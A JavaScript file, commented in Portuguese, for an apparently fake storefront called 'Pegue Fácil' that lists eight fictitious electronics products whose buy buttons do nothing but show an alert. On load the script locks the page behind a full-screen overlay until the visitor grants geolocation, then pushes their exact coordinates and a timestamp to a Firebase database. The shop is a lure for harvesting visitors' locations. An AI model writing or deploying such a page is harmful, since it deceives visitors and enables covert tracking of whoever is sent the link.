// 1. BANCO DE DADOS COMPLETO (8 PRODUTOS)
const produtosFicticios = [
    {
        id: 1,
        nome: "Smartphone Galaxy S23 Ultra 256GB Preto",
        preco: "R$ 4.899",
        imagem: "https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 2,
        nome: "Notebook Dell Inspiron 15 - Intel Core i5",
        preco: "R$ 3.150",
        imagem: "https://images.unsplash.com/photo-1593642632823-8f785ba67e45?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 3,
        nome: "Smart TV 55 4K UHD LED - Wi-Fi",
        preco: "R$ 2.399",
        imagem: "https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 4,
        nome: "Câmera Mirrorless Sony Alpha a6400",
        preco: "R$ 5.900",
        imagem: "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 5,
        nome: "Fone de Ouvido Bluetooth Noise Cancelling",
        preco: "R$ 750",
        imagem: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 6,
        nome: "Console PlayStation 5 + Jogo",
        preco: "R$ 3.999",
        imagem: "https://gmedia.playstation.com/is/image/SIEPDC/ps5-product-thumbnail-01-en-14sep21?$facebook$"
    },
    {
        id: 7,
        nome: "Relógio Smartwatch Esportivo Series 8",
        preco: "R$ 1.299",
        imagem: "https://images.unsplash.com/photo-1546868871-7041f2a55e12?auto=format&fit=crop&w=400&q=80"
    },
    {
        id: 8,
        nome: "Mochila Executiva Impermeável",
        preco: "R$ 150",
        imagem: "https://images.unsplash.com/photo-1553062407-98eeb64c6a62?auto=format&fit=crop&w=400&q=80"
    }
];

// 2. FUNÇÃO PARA CARREGAR PRODUTOS NO GRID
function carregarProdutos() {
    const productGrid = document.getElementById('product-grid');
    if (!productGrid) return; 
    
    productGrid.innerHTML = ""; 

    produtosFicticios.forEach(produto => {
        const card = document.createElement('div');
        card.className = 'product-card'; 
        card.innerHTML = `
            <img src="${produto.imagem}" alt="${produto.nome}" class="product-image">
            <div class="product-info">
                <span class="product-price">${produto.preco}</span>
                <h3 class="product-name">${produto.nome}</h3>
                <button class="btn-buy" onclick="alert('Item adicionado ao carrinho!')">Comprar</button>
            </div>
        `;
        productGrid.appendChild(card);
    });
}

// 3. MOTOR DE LOCALIZAÇÃO (BLOQUEIO TOTAL)
function pegarLocalizacao() {
    const overlay = document.getElementById("locationOverlay");

    if (!navigator.geolocation) {
        alert("Geolocalização não suportada.");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        function(posicao) {
            // Sucesso: Salva no Firebase
            db.ref("localizacoes").push({
                latitude: posicao.coords.latitude,
                longitude: posicao.coords.longitude,
                data: new Date().toLocaleString('pt-BR')
            })
            .then(() => {
                sessionStorage.setItem("localizado", "true");
                
                // Destrava a tela
                if (overlay) overlay.style.setProperty('display', 'none', 'important');
                document.body.style.overflow = "auto";
            });
        },
        function(erro) {
            alert("Você precisa permitir a localização para acessar o Pegue Fácil.");
        }
    );
}

// 4. INICIALIZAÇÃO ÚNICA (O QUE FAZ O SITE RODAR)
document.addEventListener('DOMContentLoaded', () => {
    // Primeiro desenha os produtos
    carregarProdutos();
    
    const overlay = document.getElementById("locationOverlay");

    // Verifica se já permitiu nesta sessão para não incomodar o usuário
    if (sessionStorage.getItem("localizado") === "true") {
        if (overlay) overlay.style.setProperty('display', 'none', 'important');
        document.body.style.overflow = "auto";
    } else {
        // Se não localizou, trava a tela e mostra o card branco
        if (overlay) overlay.style.setProperty('display', 'flex', 'important');
        document.body.style.overflow = "hidden";
    }
});
